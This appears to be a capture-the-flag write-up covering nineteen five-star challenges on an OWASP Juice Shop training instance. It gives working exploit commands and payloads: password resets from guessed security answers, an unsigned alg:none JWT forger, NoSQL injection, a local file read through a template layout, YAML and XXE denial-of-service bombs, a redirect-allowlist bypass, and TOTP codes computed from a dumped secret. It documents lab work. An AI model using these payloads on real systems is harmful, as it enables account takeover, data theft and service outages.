# 5-Star Challenges (★★★★★)

Writeups for the nineteen five-star challenges documented in [`../../JUICE.md`](../../JUICE.md) under "5-Star Findings" (#79–#97). **Register cross-check:** the register line `★★★★★ (19):` enumerates exactly these nineteen challenges (Change Bender's Password, Leaked Access Logs, Email Leak, Extra Language, Unsigned JWT, Leaked API Key, Local File Read, NoSQL Exfiltration, Blocked RCE DoS, Reset Bjoern's Password, Reset Morty's Password, Retrieve Blueprint, Supply Chain Attack, Cross-Site Imaging, Blockchain Hype, Two Factor Authentication, Frontend Typosquatting, XXE DoS, Memory Bomb) — no omissions, no extras. Entries marked *(team activity)* were solved on the shared team instance and are written at register level.

## Summary

1. Reset Bjoern's (internal) Password
2. Reset Morty's Password
3. Email Leak *(team activity)*
4. Extra Language
5. Unsigned JWT *(team activity)*
6. NoSQL Exfiltration (orders) *(team activity)*
7. Leaked Access Logs (password spraying)
8. Local File Read
9. Blocked RCE DoS
10. Memory Bomb (YAML)
11. Change Bender's Password *(team activity)*
12. Retrieve Blueprint *(team activity)*
13. Supply Chain Attack *(team activity)*
14. Cross-Site Imaging (SVG)
15. Blockchain Hype (token sale) *(team activity)*
16. Two Factor Authentication *(team activity)*
17. Frontend Typosquatting (Angular) *(team activity)*
18. XXE DoS
19. Leaked API Key *(team activity)*

> **Prerequisites.** Instance = OWASP Juice Shop v20.2.0 behind the MultiJuicer reverse proxy (`$BASE_URL`). Attach the team `multi-juicer` session cookie to every request (live proxy hostname <redacted>) or every path 302s to `/multi-juicer`. Auth split: most `/rest`+`/api` accept `Authorization: Bearer <jwt>`; `/rest/user/whoami`, `/profile`, `/dataerasure` read the JWT from the `token` cookie, which is validated against an in-memory auth store — re-login after any instance restart. Re-check `/api/Challenges/` before and after each attempt; the sandboxed DoS challenges (RCE/XML/YAML) are safe to run (graceful 503/guarded), unlike the Mongo `sleep()` crash.

---

## 1. Reset Bjoern's (internal) Password
Difficulty: ★★★★★ | Vulnerability class: Weak password-recovery mechanism (CWE-640)
- Attack surface: `GET /rest/user/security-question?email=` and `POST /rest/user/reset-password`
- Root cause: The reset flow trusts the plaintext answer to a "secret" question. Bjoern's *internal* account (`bjoern@juice-sh.op`) answers truthfully but with an OSINT-derivable fact with a "historical twist": **`West-2082`**, the old postal code of his hometown Uetersen. Answers are only stored as `HMAC-SHA256(answer, '<static key>')`, so no real step-up protects the reset.
- Exploit:
  ```bash
  curl -s "$BASE_URL/rest/user/security-question?email=bjoern@juice-sh.op"
  curl -s -X POST "$BASE_URL/rest/user/reset-password" -H 'Content-Type: application/json' \
    --data-binary '{"email":"bjoern@juice-sh.op","answer":"West-2082","new":"<newpw>","repeat":"<newpw>"}'
  curl -s -X POST "$BASE_URL/rest/user/login" -H 'Content-Type: application/json' \
    --data-binary '{"email":"bjoern@juice-sh.op","password":"<newpw>"}'
  ```
- Verification: Reset returns `{"user":...}`, the follow-up login returns a valid JWT, and `GET /api/Challenges/` shows the reset challenge solved (answer + account match the verifier exactly).

## 2. Reset Morty's Password
Difficulty: ★★★★★ | Vulnerability class: Weak/obfuscated security answer + bypassable rate limit (CWE-640, CWE-307)
- Attack surface: `POST /rest/user/reset-password`
- Root cause: Morty answered his security question truthfully but *obfuscated* it: his dog is **Snowball** → leetspeak **`5N0wb41L`** (answers are again just HMAC-checked). The reset endpoint's rate limiter keys on the spoofable `X-Forwarded-For` header (100 tries / 5 min), so even a brute force of the short answer would be feasible.
- Exploit:
  ```bash
  curl -s -X POST "$BASE_URL/rest/user/reset-password" -H 'Content-Type: application/json' \
    --data-binary '{"email":"morty@juice-sh.op","answer":"5N0wb41L","new":"<newpw>","repeat":"<newpw>"}'
  curl -s -X POST "$BASE_URL/rest/user/login" -H 'Content-Type: application/json' \
    --data-binary '{"email":"morty@juice-sh.op","password":"<newpw>"}'
  ```
- Verification: Reset accepts the leet answer (`{"user":...}`), login with the new password succeeds, and the reset challenge flips in `/api/Challenges/`.

## 3. Email Leak *(team activity)*
Difficulty: ★★★★★ | Vulnerability class: Cross-domain information disclosure via JSONP (CWE-200 / CWE-346)
- Attack surface: `GET /rest/user/whoami?callback=cb` (cookie-authenticated)
- Root cause: The whoami endpoint answers to a reflective `callback` query parameter with a real JSONP response (`res.jsonp`), i.e. user PII is served as executable JavaScript. That is an old, no-longer-recommended way to move data cross-domain: a script tag from any other origin carries the user's cookies and hands the wrapped identity object to the attacker's callback. Register-level: the email of an *extra* (non-UI) account was disclosed this way.
- Exploit: while holding a valid session, load the identity endpoint with a callback and consume it from a second origin:
  ```
  GET /rest/user/whoami?callback=steal
  -> steal({"user":{"email":"<extra-user>@juice-sh.op", ...}})
  ```
- Verification: The JSONP response is served (content-type `application/javascript`) and the `Email Leak` challenge appears solved on the score board.

## 4. Extra Language
Difficulty: ★★★★★ | Vulnerability class: Incomplete allowlist / exposed unshipped assets (CWE-184)
- Attack surface: `GET /assets/i18n/tlh_AA.json`
- Root cause: Language packs are served straight off disk with no allowlist. The Klingon translation `tlh_AA.json` ships inside the frontend bundle but was deliberately left out of production: `/rest/languages` (built from the same directory) explicitly excludes `en.json` and `tlh_AA.json` from the picker. Requesting the pack that "never made it into production" is the intended disclosure.
- Exploit:
  ```bash
  curl -i "$BASE_URL/assets/i18n/tlh_AA.json"        # 200, Klingon strings
  ```
  (Equivalent UI path: switch the language selector — Klingon is absent, hence the direct request.)
- Verification: The server-side verifier fires on any URL ending in `/tlh_AA.json`; the file is returned and `Extra Language` flips to solved.

## 5. Unsigned JWT *(team activity)*
Difficulty: ★★★★★ | Vulnerability class: JWT signature verification bypass / alg:none (CWE-347, vulnerable component)
- Attack surface: any authenticated route reading a JWT (`Authorization: Bearer`, `token` cookie, or SPA `localStorage['token']`)
- Root cause: The app pins a legacy JWT library (`jsonwebtoken` 0.4.0) whose `verify()` accepts tokens with `alg: none` and an empty signature. A forged unsigned token impersonating the non-existing user **`jwtn3d@juice-sh.op`** is treated as valid, so no signing key is ever needed.
- Exploit:
  ```bash
  python3 - <<'EOF'
  import base64, json
  def b64(o): return base64.urlsafe_b64encode(json.dumps(o,separators=(',',':')).encode()).rstrip(b'=')
  h = b64({"alg":"none","typ":"JWT"})
  p = b64({"data":{"email":"jwtn3d@juice-sh.op"},"iat":1508639612,"exp":9999999999})
  print(f"{h.decode()}.{p.decode()}.")
  EOF
  ```
  Set the result as `localStorage['token']` (playwright `addInitScript`) or send it on a protected call, e.g. `GET /rest/user/whoami` with `Cookie: token=<forged>`.
- Verification: The request is accepted (no signature error) and the verifier — which matches `header.alg === 'none'` plus the `jwtn3d@` email on any incoming token — solves `Unsigned JWT`.

## 6. NoSQL Exfiltration (orders) *(team activity)*
Difficulty: ★★★★★ | Vulnerability class: NoSQL injection in `$where` (CWE-943)
- Attack surface: `GET /rest/track-order/:id`
- Root cause: The single-order lookup builds its Mongo query from the raw route parameter: `ordersCollection.find({ $where: "this.orderId === '<id>'" })`. Injecting into that JavaScript predicate negates the equality and makes the "deliver a single order" endpoint return **more than one row** — including orders that are not ours. (The verifier literally requires `result.data.length > 1`.)
- Exploit:
  ```
  id = '||'1'=='1
  ```
  ```bash
  curl -s --path-as-is "$BASE_URL/rest/track-order/%27%7C%7C%271%27%3D%3D%271"
  ```
- Verification: The JSON response contains every stored order (`data.length > 1`, mixed `orderId` prefixes), i.e. cross-user order data is exfiltrated, and `NoSQL Exfiltration` is solved.

## 7. Leaked Access Logs (password spraying)
Difficulty: ★★★★★ | Vulnerability class: Log-file disclosure → credential reuse/spraying (CWE-532, CWE-521)
- Attack surface: `GET /support/logs/` + `GET /support/logs/:file`, then `POST /rest/user/login`
- Root cause: The server log directory is publicly browsable and served (`logs/*`), so the access log — and the publicly dumped copy of it that this challenge is built around — leaks a plaintext credential pair for an *original* (non-default) account. Reusing that password against the real account is the "dumpster-dive + password spraying" intended path.
- Exploit:
  ```bash
  curl -s "$BASE_URL/support/logs/"                      # dir listing (solves 4★ Access Log)
  curl -s "$BASE_URL/support/logs/access.log" > access.log
  grep -iE "password|login" access.log                   # harvest the leaked pair
  ```
  Spray the recovered credential at login (send via body file to avoid shell mangling of `$`/`§`):
  ```bash
  printf '{"email":"J12934@juice-sh.op","password":"0Y8rMnww$*9VFYE§59-!Fg1L6t&6lB"}' > login.json
  curl -s -X POST "$BASE_URL/rest/user/login" -H 'Content-Type: application/json' --data-binary @login.json
  ```
- Verification: Login returns `{"authentication":{"token":...}}` (J12934 is an admin seed account) and `Leaked Access Logs` flips to solved — creating a fresh account with the same password does *not* qualify.

## 8. Local File Read
Difficulty: ★★★★★ | Vulnerability class: Server-side file read via template layout (CWE-98)
- Attack surface: `POST /dataerasure` (cookie `token` auth)
- Root cause: The GDPR erasure POST passes the attacker-controlled `layout` body parameter straight into Handlebars view rendering, so the referenced file is read from disk as the layout template and its beginning is echoed back. The only filter blacklists paths containing `ftp`, `ctf.key` or `encryptionkeys`; everything else on the server is fair game. Response is a **100-char preview** (`html.slice(0,100)`).
- Exploit (use a throwaway account — the POST also files a deletion request and clears the cookie):
  ```bash
  curl -s -X POST "$BASE_URL/dataerasure" -H "Cookie: token=$TOK" \
    --data-urlencode 'layout=/juice-shop/package.json'
  ```
- Verification: The response previews the beginning of the app manifest, confirming the read of `/juice-shop/package.json` — this is how **v20.2.0** was fingerprinted — and `Local File Read` is solved. Any server file readable by the process works the same way (100-char preview; bulk source review was cross-referenced against the pinned release instead).

## 9. Blocked RCE DoS
Difficulty: ★★★★★ | Vulnerability class: Sandboxed code injection → DoS, guarded (CWE-94)
- Attack surface: `POST /b2b/v2/orders` (Bearer auth)
- Root cause: `orderLinesData` is evaluated as JavaScript with `notevil` inside a `vm` (2 s timeout). `notevil` defends itself by capping iterations, so a naive infinite loop never reaches the timeout — it is caught by the sandbox itself.
- Exploit:
  ```bash
  printf '{"cid":"x","orderLinesData":"while(true){}"}' > rce.json
  curl -s -X POST "$BASE_URL/b2b/v2/orders" -H "Authorization: Bearer $TOK" \
    -H 'Content-Type: application/json' --data-binary @rce.json
  ```
- Verification: The eval aborts with `Infinite loop detected - reached max iterations`, exactly the error the verifier watches for, and `Blocked RCE DoS` is solved while the instance stays up. **Contrast (6★ Successful RCE DoS):** an infinite loop never reaches the 2 s `vm` timeout; a *finite but slow* payload does — catastrophic regex backtracking, `orderLinesData: "/((a+)+)b/.test('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!')"`, times out the `vm` and returns `503 Script execution timed out`.

## 10. Memory Bomb (YAML)
Difficulty: ★★★★★ | Vulnerability class: Unsafe YAML deserialization → resource exhaustion (CWE-502)
- Attack surface: `POST /file-upload` (multipart, field `file`, `.yml`/`.yaml`)
- Root cause: Uploaded YAML is parsed with `js-yaml` inside a `vm` (2 s timeout). YAML alias references are expanded into copies, so a nested alias-expansion bomb ("billion laughs") balloons into an unmanageable string — the parse throws `Invalid string length` or times out.
- Exploit — `bomb.yml`:
  ```yaml
  a: &a ["x","x","x","x","x","x","x","x","x","x"]
  b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a,*a]
  c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b,*b]
  d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c,*c]
  e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d,*d]
  f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e,*e]
  g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f,*f]
  ```
  ```bash
  curl -s -F "file=@bomb.yml" "$BASE_URL/file-upload"
  ```
- Verification: The upload returns a graceful `503 Sorry, we are temporarily not available!` and `Memory Bomb` is solved. The sandboxed failure is safe — unlike the Mongo `sleep()` DoS this never took the pod down.

## 11. Change Bender's Password *(team activity)*
Difficulty: ★★★★★ | Vulnerability class: Unverified password change (CWE-620)
- Attack surface: `GET /rest/user/change-password?current=&new=&repeat=` (Bearer auth)
- Root cause: The change-password handler only checks the `current` password *if the parameter is supplied at all* and only against the authenticated user's own record. Register-level: with an authenticated Bender session (id 3, obtained via his earlier recovered/history-leaked password — the "password-history/leak bypass", no SQLi, no Forgot Password) the endpoint will happily set `new` while `current` is omitted.
- Exploit:
  ```bash
  curl -s "$BASE_URL/rest/user/change-password?new=slurmCl4ssic&repeat=slurmCl4ssic" \
    -H "Authorization: Bearer $BENDER_TOKEN"
  ```
- Verification: `{"user":...}` is returned with the updated account; the verifier (user id 3, no `current`, password hash == `slurmCl4ssic`) flips `Change Bender's Password`. A follow-up login as `bender@juice-sh.op` / `slurmCl4ssic` succeeds.

## 12. Retrieve Blueprint *(team activity)*
Difficulty: ★★★★★ | Vulnerability class: Sensitive data exposure — unlisted product asset (CWE-200)
- Attack surface: `GET /assets/public/images/products/JuiceShop.stl`
- Root cause: The 3D-printable **OWASP Juice Shop Logo (3D-printed)** product has an industrial blueprint: an STL file shipped inside the public web assets, unlinked from any UI. Register-level: downloading that internal blueprint deprives the shop of earnings from the 3D-print product.
- Exploit:
  ```bash
  curl -sO "$BASE_URL/assets/public/images/products/JuiceShop.stl"
  ```
- Verification: A binary STL (`solid ...` header) is downloaded and `Retrieve Blueprint` flips to solved (the verifier matches any request whose URL ends in the blueprint filename).

## 13. Supply Chain Attack *(team activity)*
Difficulty: ★★★★★ | Vulnerability class: Malicious third-party component in the dev toolchain (CWE-1104)
- Attack surface: report submission via `POST /api/Complaints` (Bearer auth); verifier scans feedback + complaints
- Root cause: Register-level: the *development team's* credentials were at risk through a genuine supply-chain incident — the 2018 malicious publish of the npm package **`eslint-scope`** (v3.7.2) that exfiltrated developers' `.npmrc` credentials. It affects only the shop's developers, never its customers, hence the "inform the development team" wording.
- Exploit: report the upstream identifier so the scanner matches it:
  ```bash
  printf '{"message":"eslint-scope/issues/39 - malicious npm:eslint-scope:20180712 release"}' > report.json
  curl -s -X POST "$BASE_URL/api/Complaints" -H "Authorization: Bearer $TOK" \
    -H 'Content-Type: application/json' --data-binary @report.json
  ```
- Verification: The pattern scan (`%eslint-scope/issues/39%` / `%npm:eslint-scope:20180712%`) matches on the next request and `Supply Chain Attack` is solved.

## 14. Cross-Site Imaging (SVG)
Difficulty: ★★★★★ | Vulnerability class: SVG injection / cross-site content inclusion + open-redirect allowlist bypass (CWE-79 / CWE-829)
- Attack surface: `/socket.io` event `verifySvgInjectionChallenge`; the vulnerable decal surface is the Deluxe Membership page (`/#/deluxe-membership?testDecal=...`)
- Root cause: The shop renders an externally supplied SVG decal (it loads an image URL and includes it on the delivery box graphic) without sanitising the remote SVG. The intended chain is an attacker SVG that drives the top window into the shop's own redirect endpoint. The only gate is the redirect check, which demands the URL both match the cataas.com kitten pattern **and** pass `isRedirectAllowed()` — a `/redirect?to=...&ref=<allowlisted host>` shape satisfies both. This challenge is verified **over Socket.IO, not HTTP** (`lib/startup/registerWebsocketEvents.ts` listens for the event, matches `/.*\.\.\/\.\.\/\.\.[\w/-]*?\/redirect\?to=https?:\/\/cataas.com\/cat.*/` and calls `isRedirectAllowed(data)`).
- Exploit (raw Socket.IO polling, `multi-juicer` cookie attached):
  ```
  GET  /socket.io/?EIO=4&transport=polling                 -> {"sid": ...}
  POST /socket.io/?EIO=4&transport=polling&sid=<sid>  body: 40
  POST /socket.io/?EIO=4&transport=polling&sid=<sid>
       body: 42["verifySvgInjectionChallenge","../../../redirect?to=https://cataas.com/cat&ref=https://github.com/juice-shop/juice-shop"]
  ```
  The trailing `ref=https://github.com/juice-shop/juice-shop` is what makes the redirect allowlist check pass.
- Verification: The server acknowledges the event and `Cross-Site Imaging` flips to solved on the next `/api/Challenges/` read.

## 15. Blockchain Hype (token sale) *(team activity)*
Difficulty: ★★★★★ | Vulnerability class: Early/unannounced feature disclosure via wallet interaction (Web3 surface)
- Attack surface: token-sale page / wallet interaction endpoints
- Root cause: Register-level: the shop's token sale was meant to be announced later, but participating before the announcement leaks it. The team engaged the sale through a wallet interaction (buy/sell of the offered token) rather than only viewing the announcement material.
- Exploit: (register level) connected a funded wallet, approved/participated in the token-sale interaction, and observed the shop register the participation.
- Verification: Score board shows `Blockchain Hype` solved after the wallet interaction.

## 16. Two Factor Authentication *(team activity)*
Difficulty: ★★★★★ | Vulnerability class: Insecurely stored TOTP secrets (CWE-522)
- Attack surface: `POST /rest/user/login`, the SQLi user-credentials dump, `POST /rest/2fa/verify`
- Root cause: Register-level: the 2FA *secret itself* (`totpSecret`) is stored in plaintext in the `Users` table and is readable through the existing SQLi user-credentials primitive — exactly the "critically sensitive" part of TOTP. Disabling/overwriting 2FA does not count; the verifier only solves when a *valid* TOTP is submitted for the seed user **`wurstbrot`**.
- Exploit:
  1. Log in with the seed account's credentials (password is part of the public 24-user seed) — the login returns `401 {"status":"totp_token_required", data:{tmpToken:...}}`:
     ```bash
     printf '{"email":"wurstbrot@juice-sh.op","password":"EinBelegtesBrotMitSchinkenSCHINKEN!"}' > l.json
     curl -s -X POST "$BASE_URL/rest/user/login" -H 'Content-Type: application/json' --data-binary @l.json
     ```
  2. Read `wurstbrot`'s `totpSecret` from `Users` via the UNION-based credentials dump (see ★★★★ User Credentials; observed value `IFTXE3SPOEYVURT2MRYGI52TKJ4HC3KH`).
  3. Compute the current code and verify:
     ```bash
     oathtool --totp --base32 IFTXE3SPOEYVURT2MRYGI52TKJ4HC3KH
     curl -s -X POST "$BASE_URL/rest/2fa/verify" -H 'Content-Type: application/json' \
       --data-binary '{"tmpToken":"<from step 1>","totpToken":"<code>"}'
     ```
- Verification: `2fa/verify` returns a real session token (`{"authentication":{...}}`) and `Two Factor Authentication` flips to solved — the TOTP was validated against the *stored* secret, not a bypass.

## 17. Frontend Typosquatting (Angular) *(team activity)*
Difficulty: ★★★★★ | Vulnerability class: Typosquatted frontend dependency (supply chain, CWE-1104)
- Attack surface: report submission via `POST /api/Complaints` (Bearer auth); verifier scans feedback + complaints
- Root cause: Register-level: a typosquatting imposter dug deep into the *frontend* build — a lookalike Angular package masquerading as the legitimate `@ngx-cookie`(-service) library. Its exact name had to be reported to the shop.
- Exploit: report the exact culprit name:
  ```bash
  printf '{"message":"frontend ships typosquatted package ngy-cookie"}' > report.json
  curl -s -X POST "$BASE_URL/api/Complaints" -H "Authorization: Bearer $TOK" \
    -H 'Content-Type: application/json' --data-binary @report.json
  ```
- Verification: The pattern scan for `%ngy-cookie%` matches on the next request and `Frontend Typosquatting` is solved.

## 18. XXE DoS
Difficulty: ★★★★★ | Vulnerability class: XXE → denial of service (CWE-611 / CWE-776)
- Attack surface: `POST /file-upload` (multipart, field `file`, `.xml`)
- Root cause: The deprecated B2B XML upload is parsed by `libxml2-wasm` inside a `vm` with a 2 s timeout. A classic billion-laughs entity bomb does **not** work — libxml2 expands it well inside the budget and the handler returns `410`. The reliable trigger is a *blocking read*: referencing an entity that never returns stalls the parse until `Script execution timed out`.
- Exploit — `x.xml`:
  ```xml
  <?xml version="1.0"?>
  <!DOCTYPE foo [ <!ENTITY x SYSTEM "file:///dev/random"> ]>
  <foo>&x;</foo>
  ```
  ```bash
  curl -s -F "file=@x.xml" "$BASE_URL/file-upload"
  ```
- Verification: The upload returns `503 Sorry, we are temporarily not available!` (`Script execution timed out` behind the scenes) and `XXE DoS` is solved while the instance stays healthy.

## 19. Leaked API Key *(team activity)*
Difficulty: ★★★★★ | Vulnerability class: Exposed credential for external automation (CWE-798)
- Attack surface: report submission via `POST /api/Complaints` (Bearer auth); verifier scans feedback + complaints
- Root cause: Register-level: an API key belonging to a scheduled, "behind the scenes" automation (entirely outside the web application) was found exposed in the shop's public footprint. The shop had to be told the exact key.
- Exploit: report the exact leaked key:
  ```bash
  printf '{"message":"leaked API key 6PPi37DBxP4lDwlriuaxP15HaDJpsUXY5TspVmie"}' > report.json
  curl -s -X POST "$BASE_URL/api/Complaints" -H "Authorization: Bearer $TOK" \
    -H 'Content-Type: application/json' --data-binary @report.json
  ```
- Verification: The verifier matches the literal key `6PPi37DBxP4lDwlriuaxP15HaDJpsUXY5TspVmie` and `Leaked API Key` flips to solved on the next request.
